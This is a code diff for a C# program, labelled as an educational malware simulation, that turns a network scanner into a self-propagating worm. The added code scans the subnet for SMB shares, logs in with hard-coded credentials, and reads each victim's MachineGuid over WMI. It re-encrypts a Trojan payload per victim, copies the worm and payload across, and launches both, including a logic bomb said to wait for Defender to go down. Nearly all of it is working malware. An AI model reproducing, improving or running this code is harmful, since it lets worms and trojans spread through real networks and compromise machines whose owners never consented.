@@ -6,20 +6,28 @@ using System.Linq;
 using System.Management;
 using System.Net.NetworkInformation;
 using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using AuthenticationLevel = System.Management.AuthenticationLevel;
+using Microsoft.Win32;
 
+/// <summary>
+/// EDUCATIONAL MALWARE SIMULATION - FOR CYBERSECURITY COURSE ONLY
+/// Self-Propagating Worm with Polymorphic Encryption
+/// MUST ONLY BE RUN IN ISOLATED VM ENVIRONMENTS
+/// </summary>
 class Program
 {
-    // Configuration - Consider moving to config file for production lab use
     private const string SMB_USERNAME = "user";
     private const string SMB_PASSWORD = "user";
     private const string SMB_SHARE_NAME = "SharedFolder";
     private const string PAYLOAD_FOLDER_NAME = "payload";
-    private const string EXECUTABLE_TO_RUN = "LogicBomb.exe";
+    private const string WORM_EXE_NAME = "Worm.exe";
+    private const string LOGICBOMB_EXE_NAME = "LogicBomb.exe";
+    private const string ENCRYPTED_BOMB_NAME = "bomb.encrypted";
 
-    // Operational parameters
     private const int PING_TIMEOUT_MS = 300;
     private const int MAX_CONCURRENT_SCANS = 50;
     private const int SCAN_TIMEOUT_MINUTES = 5;
@@ -27,11 +35,12 @@ class Program
     static async Task Main()
     {
         Console.WriteLine("===========================================");
-        Console.WriteLine("MALWARE PROPAGATION SIMULATION - EDUCATIONAL USE ONLY");
+        Console.WriteLine("SELF-PROPAGATING WORM - EDUCATIONAL USE ONLY");
+        Console.WriteLine("Polymorphic Encryption Edition");
         Console.WriteLine("===========================================");
         Console.WriteLine();
 
-        Console.WriteLine("Starting IP Range, SMB Scan, Self-Deployment, and Remote Execution Test...");
+        Console.WriteLine("Starting Network Scan, Polymorphic Encryption, and Self-Propagation...");
         Console.WriteLine("-----------------------------------");
 
         string localIP = GetLocalIPAddress();
@@ -51,7 +60,6 @@ class Program
 
         try
         {
-            // Scan with timeout and progress reporting
             using (var cts = new CancellationTokenSource(TimeSpan.FromMinutes(SCAN_TIMEOUT_MINUTES)))
             {
                 var progress = new Progress<ScanProgress>(p =>
@@ -60,7 +68,7 @@ class Program
                 });
 
                 smbHosts = await FindSmbServersAsync(baseIP, progress, cts.Token);
-                Console.WriteLine(); // New line after progress
+                Console.WriteLine();
             }
 
             if (smbHosts.Count == 0)
@@ -73,7 +81,7 @@ class Program
             LogInfo($"Found {smbHosts.Count} SMB host(s) with accessible shares.");
 
             // Prepare deployment package
-            tempFolder = Path.Combine(Path.GetTempPath(), $"IpScannerDeployment_{Guid.NewGuid():N}");
+            tempFolder = Path.Combine(Path.GetTempPath(), $"WormDeployment_{Guid.NewGuid():N}");
             LogInfo($"Preparing deployment package in temporary folder: {tempFolder}");
             PrepareDeploymentPackage(tempFolder);
 
@@ -84,7 +92,7 @@ class Program
             }
 
             Console.WriteLine("-----------------------------------");
-            LogInfo("Scan, deployment, and remote execution complete.");
+            LogInfo("Network propagation complete.");
         }
         catch (OperationCanceledException)
         {
@@ -97,7 +105,6 @@ class Program
         }
         finally
         {
-            // Cleanup - ensure temp folder is deleted
             if (tempFolder != null && Directory.Exists(tempFolder))
             {
                 try
@@ -119,7 +126,8 @@ class Program
     private static async Task ProcessTargetHost(string ip, string tempFolder)
     {
         string remoteShareUNC = $"\\\\{ip}\\{SMB_SHARE_NAME}";
-        LogInfo($"Attempting SMB login on {remoteShareUNC}...");
+        LogInfo($"Processing target: {ip}");
+        LogInfo($"Attempting SMB connection to {remoteShareUNC}...");
 
         int smbConnectResult = ConnectToRemoteShare(remoteShareUNC, SMB_USERNAME, SMB_PASSWORD);
 
@@ -127,24 +135,72 @@ class Program
         {
             try
             {
-                LogSuccess($"Connected to {ip}. Copying deployment files...");
-                await CopyFolderAsync(tempFolder, remoteShareUNC);
-                LogSuccess($"Files copied to {remoteShareUNC}");
+                LogSuccess($"Connected to {ip}");
 
-                LogInfo($"Attempting to execute '{EXECUTABLE_TO_RUN}' on {ip} using WMI...");
+                // Step 1: Get victim's Machine GUID
+                string victimMachineGuid = GetRemoteMachineGuid(ip, SMB_USERNAME, SMB_PASSWORD);
+                LogInfo($"Victim Machine GUID: {victimMachineGuid}");
 
-                string remoteServerPathToExecutable = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{EXECUTABLE_TO_RUN}";
+                // Step 2: Re-encrypt Trojan.exe with victim-specific key
+                LogInfo($"Generating victim-specific encryption for {ip}...");
+                string victimSpecificBomb = Path.Combine(tempFolder, "bomb_victim.encrypted");
+                ReEncryptTrojanForVictim(tempFolder, victimSpecificBomb, victimMachineGuid);
+                LogSuccess($"Created victim-specific encrypted payload");
 
-                bool executionSuccess = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteServerPathToExecutable);
+                // Step 3: Copy files to victim
+                LogInfo($"Copying files to {remoteShareUNC}...");
 
-                if (executionSuccess)
+                // Copy Worm.exe
+                string localWormPath = Path.Combine(tempFolder, WORM_EXE_NAME);
+                string remoteWormPath = Path.Combine(remoteShareUNC, WORM_EXE_NAME);
+                File.Copy(localWormPath, remoteWormPath, true);
+                LogSuccess($"Copied {WORM_EXE_NAME}");
+
+                // Copy payload folder
+                string localPayloadFolder = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME);
+                string remotePayloadFolder = Path.Combine(remoteShareUNC, PAYLOAD_FOLDER_NAME);
+                await CopyFolderAsync(localPayloadFolder, remotePayloadFolder);
+
+                // Overwrite bomb.encrypted with victim-specific version
+                string remoteBombPath = Path.Combine(remotePayloadFolder, ENCRYPTED_BOMB_NAME);
+                File.Copy(victimSpecificBomb, remoteBombPath, true);
+                LogSuccess($"Deployed victim-specific encrypted payload");
+
+                // Step 4: Execute both Worm and LogicBomb on victim via WMI
+                LogInfo($"Executing self-propagation on {ip}...");
+
+                string remoteWormExePath = $"C:\\{SMB_SHARE_NAME}\\{WORM_EXE_NAME}";
+                string remoteLogicBombPath = $"C:\\{SMB_SHARE_NAME}\\{PAYLOAD_FOLDER_NAME}\\{LOGICBOMB_EXE_NAME}";
+
+                // Execute Worm (for continued spreading)
+                bool wormExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteWormExePath, "Worm");
+                if (wormExecuted)
                 {
-                    LogSuccess($"'{EXECUTABLE_TO_RUN}' executed successfully on {ip}");
+                    LogSuccess($"Worm.exe executed on {ip} - will continue spreading");
                 }
                 else
                 {
-                    LogWarning($"Could not execute '{EXECUTABLE_TO_RUN}' on {ip} using WMI.");
+                    LogWarning($"Failed to execute Worm.exe on {ip}");
                 }
+
+                // Execute LogicBomb (waits for Defender to go down)
+                bool logicBombExecuted = ExecuteRemoteCommandWMI(ip, SMB_USERNAME, SMB_PASSWORD, remoteLogicBombPath, "LogicBomb");
+                if (logicBombExecuted)
+                {
+                    LogSuccess($"LogicBomb.exe executed on {ip} - monitoring for trigger");
+                }
+                else
+                {
+                    LogWarning($"Failed to execute LogicBomb.exe on {ip}");
+                }
+
+                // Clean up victim-specific bomb file
+                if (File.Exists(victimSpecificBomb))
+                {
+                    File.Delete(victimSpecificBomb);
+                }
+
+                LogSuccess($"Successfully propagated to {ip}");
             }
             catch (Exception ex)
             {
@@ -159,6 +215,87 @@ class Program
         {
             LogWarning($"SMB connection to {ip} failed - Error Code: {smbConnectResult} ({GetWNetErrorDescription(smbConnectResult)})");
         }
+
+        Console.WriteLine();
+    }
+
+    private static string GetRemoteMachineGuid(string remoteIp, string username, string password)
+    {
+        LogInfo($"Querying Machine GUID from {remoteIp} via WMI...");
+
+        try
+        {
+            ConnectionOptions connOpts = new ConnectionOptions
+            {
+                Username = username,
+                Password = password,
+                Impersonation = ImpersonationLevel.Impersonate,
+                Authentication = AuthenticationLevel.Default,
+                EnablePrivileges = true,
+                Timeout = TimeSpan.FromSeconds(15)
+            };
+
+            string path = $"\\\\{remoteIp}\\root\\CIMV2";
+            var scope = new ManagementScope(path, connOpts);
+            scope.Connect();
+
+            // Query registry via WMI
+            string query = "SELECT * FROM StdRegProv";
+            var regProv = new ManagementClass(scope, new ManagementPath(query), null);
+
+            // Read MachineGuid from registry
+            var inParams = regProv.GetMethodParameters("GetStringValue");
+            inParams["hDefKey"] = 0x80000002; // HKEY_LOCAL_MACHINE
+            inParams["sSubKeyName"] = @"SOFTWARE\Microsoft\Cryptography";
+            inParams["sValueName"] = "MachineGuid";
+
+            var outParams = regProv.InvokeMethod("GetStringValue", inParams, null);
+
+            if (outParams != null && outParams["sValue"] != null)
+            {
+                string guid = outParams["sValue"].ToString();
+                if (!string.IsNullOrEmpty(guid))
+                {
+                    LogSuccess($"Retrieved Machine GUID from {remoteIp}: {guid}");
+                    return guid;
+                }
+            }
+        }
+        catch (Exception ex)
+        {
+            LogWarning($"Failed to get Machine GUID from {remoteIp}: {ex.Message}");
+        }
+
+        LogWarning($"Using fallback Machine ID for {remoteIp}");
+        return "DEFAULT_MACHINE_ID";
+    }
+
+    private static void ReEncryptTrojanForVictim(string tempFolder, string outputPath, string victimMachineGuid)
+    {
+        // Find original Trojan.exe in the payload folder
+        string trojanPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, "Trojan.exe");
+
+        if (!File.Exists(trojanPath))
+        {
+            // Try to find it as bomb.encrypted and decrypt first with local machine key
+            string localBombPath = Path.Combine(tempFolder, PAYLOAD_FOLDER_NAME, ENCRYPTED_BOMB_NAME);
+            if (File.Exists(localBombPath))
+            {
+                LogInfo("Decrypting local bomb.encrypted to get Trojan.exe...");
+                string localMachineGuid = CryptoUtils.GetMachineGuid();
+                CryptoUtils.DecryptFile(localBombPath, trojanPath, localMachineGuid);
+            }
+            else
+            {
+                throw new FileNotFoundException($"Trojan.exe not found at {trojanPath}");
+            }
+        }
+
+        LogInfo($"Re-encrypting Trojan.exe with victim's Machine GUID...");
+        CryptoUtils.EncryptFile(trojanPath, outputPath, victimMachineGuid);
+
+        // Log the derived keys for debugging
+        CryptoUtils.LogDerivedKeys(victimMachineGuid);
     }
 
     private static async Task<List<string>> FindSmbServersAsync(
@@ -203,17 +340,10 @@ class Program
                                 }
                                 DisconnectFromRemoteShare(smbPath);
                             }
-                            else
-                            {
-                                Console.WriteLine($"\n[ACTIVE] {ip} - Responds to ping but no accessible SMB share");
-                            }
                         }
                     }
                 }
-                catch (PingException)
-                {
-                    // Expected for non-responsive hosts - suppress
-                }
+                catch (PingException) { }
                 catch (Exception ex)
                 {
                     LogError($"{ip} - {ex.Message}");
@@ -241,7 +371,7 @@ class Program
         {
             Directory.CreateDirectory(tempFolder);
 
-            // Copy current executable
+            // Copy current Worm executable
             string exePath = Process.GetCurrentProcess().MainModule.FileName;
             string exeName = Path.GetFileName(exePath);
             string destExePath = Path.Combine(tempFolder, exeName);
@@ -261,7 +391,7 @@ class Program
             else
             {
                 LogWarning($"'{PAYLOAD_FOLDER_NAME}' folder not found at {payloadFolder}");
-                LogWarning($"Please ensure '{EXECUTABLE_TO_RUN}' is in a '{PAYLOAD_FOLDER_NAME}' folder next to this program.");
+                throw new DirectoryNotFoundException($"Payload folder not found: {payloadFolder}");
             }
 
             LogSuccess("Deployment package prepared successfully.");
@@ -327,9 +457,9 @@ class Program
         }
     }
 
-    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute)
+    private static bool ExecuteRemoteCommandWMI(string remoteIp, string username, string password, string commandToExecute, string componentName)
     {
-        LogInfo($"Attempting WMI execution (Win32_Process.Create) on {remoteIp}...");
+        LogInfo($"Attempting WMI execution of {componentName} on {remoteIp}...");
 
         try
         {
@@ -356,7 +486,7 @@ class Program
                 var inParams = processClass.GetMethodParameters("Create");
                 inParams["CommandLine"] = commandToExecute;
 
-                LogInfo($"Executing command: {commandToExecute}");
+                LogInfo($"Executing: {commandToExecute}");
                 var outParams = processClass.InvokeMethod("Create", inParams, null);
 
                 if (outParams != null)
@@ -367,20 +497,19 @@ class Program
                     string resultMessage = GetWmiReturnCodeDescription(returnCode);
                     LogInfo($"WMI Create returned code {returnCode}: {resultMessage}, ProcessID: {newPid}");
 
-                    // Consider both 0 (success) and 2 (access denied but may execute) as successful attempts
                     if (returnCode == 0)
                     {
-                        LogSuccess($"Remote execution successful on {remoteIp}");
+                        LogSuccess($"{componentName} execution successful on {remoteIp}");
                         return true;
                     }
                     else if (returnCode == 2)
                     {
-                        LogWarning($"WMI returned 'Access Denied' but process may have launched on {remoteIp}");
-                        return true; // For lab purposes, consider this a successful interaction
+                        LogWarning($"WMI returned 'Access Denied' but {componentName} may have launched on {remoteIp}");
+                        return true;
                     }
                     else
                     {
-                        LogWarning($"WMI execution failed with code {returnCode}");
+                        LogWarning($"{componentName} execution failed with code {returnCode}");
                     }
                 }
                 else
@@ -400,7 +529,6 @@ class Program
         catch (UnauthorizedAccessException uex)
         {
             LogError($"Unauthorized Access on {remoteIp}: {uex.Message}");
-            LogError("Check that credentials have appropriate WMI/DCOM permissions");
         }
         catch (System.Runtime.InteropServices.COMException comEx)
         {
@@ -414,7 +542,6 @@ class Program
         return false;
     }
 
-    // P/Invoke declarations for network share connections
     [DllImport("mpr.dll", CharSet = CharSet.Unicode)]
     private static extern int WNetAddConnection2(ref NETRESOURCE netResource, string password, string username, int flags);
 
@@ -425,7 +552,7 @@ class Program
     {
         var nr = new NETRESOURCE
         {
-            dwType = 1, // RESOURCETYPE_DISK
+            dwType = 1,
             lpRemoteName = remotePath
         };
         return WNetAddConnection2(ref nr, password, username, 0);
@@ -456,7 +583,6 @@ class Program
         public string lpProvider;
     }
 
-    // Helper methods for logging and error descriptions
     private static void LogInfo(string message)
     {
         Console.ForegroundColor = ConsoleColor.Cyan;
@@ -524,10 +650,120 @@ class Program
         Console.ReadKey();
     }
 
-    // Progress reporting struct
     private struct ScanProgress
     {
         public int Completed { get; set; }
         public int ActiveSmb { get; set; }
+    }
+
+    // Embedded CryptoUtils class
+    public static class CryptoUtils
+    {
+        private const string DEFAULT_MACHINE_ID = "DEFAULT_MACHINE_ID";
+        private const string IV_SALT = "_IV_SALT_2025";
+
+        public static string GetMachineGuid()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Cryptography"))
+                {
+                    if (key != null)
+                    {
+                        object guidValue = key.GetValue("MachineGuid");
+                        if (guidValue != null)
+                        {
+                            string guid = guidValue.ToString();
+                            if (!string.IsNullOrEmpty(guid))
+                            {
+                                return guid;
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"[CryptoUtils] Failed to read Machine GUID: {ex.Message}");
+            }
+
+            Console.WriteLine($"[CryptoUtils] Using fallback: {DEFAULT_MACHINE_ID}");
+            return DEFAULT_MACHINE_ID;
+        }
+
+        public static byte[] DeriveKeyFromMachineId(string machineId)
+        {
+            using (SHA256 sha = SHA256.Create())
+            {
+                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId);
+                byte[] hash = sha.ComputeHash(inputBytes);
+
+                byte[] key = new byte[32];
+                Array.Copy(hash, key, 32);
+
+                return key;
+            }
+        }
+
+        public static byte[] DeriveIVFromMachineId(string machineId)
+        {
+            using (SHA256 sha = SHA256.Create())
+            {
+                byte[] inputBytes = Encoding.UTF8.GetBytes(machineId + IV_SALT);
+                byte[] hash = sha.ComputeHash(inputBytes);
+
+                byte[] iv = new byte[16];
+                Array.Copy(hash, iv, 16);
+
+                return iv;
+            }
+        }
+
+        public static void EncryptFile(string inputFile, string outputFile, string machineId)
+        {
+            byte[] key = DeriveKeyFromMachineId(machineId);
+            byte[] iv = DeriveIVFromMachineId(machineId);
+
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = key;
+                aes.IV = iv;
+
+                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
+                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
+                using (CryptoStream cs = new CryptoStream(fsOutput, aes.CreateEncryptor(), CryptoStreamMode.Write))
+                {
+                    fsInput.CopyTo(cs);
+                }
+            }
+        }
+
+        public static void DecryptFile(string inputFile, string outputFile, string machineId)
+        {
+            byte[] key = DeriveKeyFromMachineId(machineId);
+            byte[] iv = DeriveIVFromMachineId(machineId);
+
+            using (Aes aes = Aes.Create())
+            {
+                aes.Key = key;
+                aes.IV = iv;
+
+                using (FileStream fsInput = new FileStream(inputFile, FileMode.Open, FileAccess.Read))
+                using (FileStream fsOutput = new FileStream(outputFile, FileMode.Create, FileAccess.Write))
+                using (CryptoStream cs = new CryptoStream(fsInput, aes.CreateDecryptor(), CryptoStreamMode.Read))
+                {
+                    cs.CopyTo(fsOutput);
+                }
+            }
+        }
+
+        public static void LogDerivedKeys(string machineId)
+        {
+            byte[] key = DeriveKeyFromMachineId(machineId);
+            byte[] iv = DeriveIVFromMachineId(machineId);
+
+            Console.WriteLine($"[CryptoUtils] Derived Key (first 16 bytes): {BitConverter.ToString(key).Replace("-", "").Substring(0, 32)}...");
+            Console.WriteLine($"[CryptoUtils] Derived IV: {BitConverter.ToString(iv).Replace("-", "")}");
+        }
     }
 }
